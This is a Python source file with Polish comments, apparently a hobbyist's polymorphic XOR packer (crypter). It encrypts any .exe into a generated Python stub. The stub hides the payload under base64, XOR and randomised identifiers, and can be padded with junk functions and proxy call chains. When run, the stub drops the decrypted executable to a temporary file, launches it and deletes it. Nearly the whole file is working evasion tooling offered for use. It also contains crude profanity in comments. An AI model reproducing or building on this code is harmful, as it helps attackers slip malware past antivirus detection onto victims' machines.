# --- code by eddit ---
# --- https://eddit.me  ---


import argparse
import base64
import os
import random
import string
import sys
def generate_random_string(length=10):
    """Generuje losowy ciąg znaków."""
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

def xor_cipher(data: bytes, key: bytes) -> bytes:
    """Szyfruje/deszyfruje dane za pomocą klucza XOR."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))
STUB_TEMPLATE = """
import base64
import subprocess
import tempfile
import os
import sys
import time

# --- Losowe funkcje śmieciowe ---
{proxy_functions}

# --- ZASZYFROWANE DANE I KLUCZ ---
B64_PAYLOAD = "{b64_payload}"
B64_KEY = "{b64_key}"
# ------------------------------------

def {xor_func_name}(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

def {main_func_name}():
    # Dekoduj dane i klucz z Base64
    try:
        {payload_var} = base64.b64decode(B64_PAYLOAD)
        {key_var} = base64.b64decode(B64_KEY)
    except Exception:
        return

    {decrypted_var} = {xor_func_name}({payload_var}, {key_var})
    
    suffix = ".exe" if sys.platform == "win32" else ""
    try:
        with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as {tmp_var}:
            {tmp_path_var} = {tmp_var}.name
            {tmp_var}.write({decrypted_var})
    except Exception:
        return

  
    try:
        subprocess.Popen([{tmp_path_var}])
    except Exception:
        pass
    finally:
        time.sleep(0.5)
        if os.path.exists({tmp_path_var}):
            try:
                os.remove({tmp_path_var})
            except Exception:
                pass


{proxy_chain}

if __name__ == "__main__":
    {entry_point}()
"""

def generate_junk_functions(num_functions=5):
    """Generuje losowe funkcje śmieciowe."""
    junk_code = ""
    for _ in range(num_functions):
        func_name = generate_random_string()
        junk_code += f"""
def {func_name}():
    # Losowa funkcja bez znaczenia
    _ = {random.randint(1, 1000)} * {random.randint(1, 1000)}
"""
    return junk_code

def generate_proxy_chain(main_func_name, num_proxies=3):
    """Generuje łańcuch funkcji proxy."""
    proxy_code = ""
    current_func = main_func_name
    for _ in range(num_proxies):
        proxy_name = generate_random_string()
        proxy_code += f"""
def {proxy_name}():
    {current_func}()
"""
        current_func = proxy_name
    return proxy_code, current_func

def main():
    parser = argparse.ArgumentParser(description="Prosty packer XOR z polimorfizmem.")
    parser.add_argument("input_file", help="Ścieżka do pliku .exe, który ma zostać spakowany.")
    parser.add_argument("-o", "--output", default="packed_stub.py", help="Nazwa wynikowego skryptu Pythona (stuba).")
    parser.add_argument("-k", "--key-size", type=int, default=32, help="Rozmiar klucza szyfrującego w bajtach.")
    parser.add_argument("--flood", action="store_true", help="Dodaj losowe funkcje śmieciowe.")
    parser.add_argument("--proxy", action="store_true", help="Dodaj proxy dla punktu wejścia.")
    
    args = parser.parse_args()

    if not os.path.exists(args.input_file):
        print(f"BŁĄD: Plik wejściowy '{args.input_file}' nie istnieje.")
        return

    key = os.urandom(args.key_size)

    with open(args.input_file, "rb") as f:
        payload = f.read()

    encrypted_payload = xor_cipher(payload, key)
    b64_payload_str = base64.b64encode(encrypted_payload).decode('utf-8')
    b64_key_str = base64.b64encode(key).decode('utf-8')
    xor_func_name = generate_random_string()
    main_func_name = generate_random_string()
    payload_var = generate_random_string()
    key_var = generate_random_string()
    tmp_var = generate_random_string()
    tmp_path_var = generate_random_string()
    decrypted_var = generate_random_string()  #jebanie w dupe

    junk_functions = generate_junk_functions(random.randint(5, 15)) if args.flood else ""

    proxy_chain, entry_point = generate_proxy_chain(main_func_name, random.randint(2, 5)) if args.proxy else ("", main_func_name)

    stub_code = STUB_TEMPLATE.format(
        b64_payload=b64_payload_str,
        b64_key=b64_key_str,
        xor_func_name=xor_func_name,
        main_func_name=main_func_name,
        payload_var=payload_var,
        key_var=key_var,
        tmp_var=tmp_var,
        tmp_path_var=tmp_path_var,
        decrypted_var=decrypted_var,  # add shit keep stron
        proxy_functions=junk_functions,
        proxy_chain=proxy_chain,
        entry_point=entry_point
    )
    with open(args.output, "w", encoding='utf-8') as f:
        f.write(stub_code)

    print("--- SUKCES! ---")
    print(f"Spakowano plik: '{args.input_file}'")
    print(f"Utworzono stub: '{args.output}'")
    print(f"Rozmiar klucza: {args.key_size} bajtów")
    print(f"Klucz (Base64): {b64_key_str}")
    if args.flood:
        print("Dodano losowe funkcje śmieciowe.")
    if args.proxy:
        print("Dodano proxy dla punktu wejścia.")

if __name__ == "__main__":
    main()
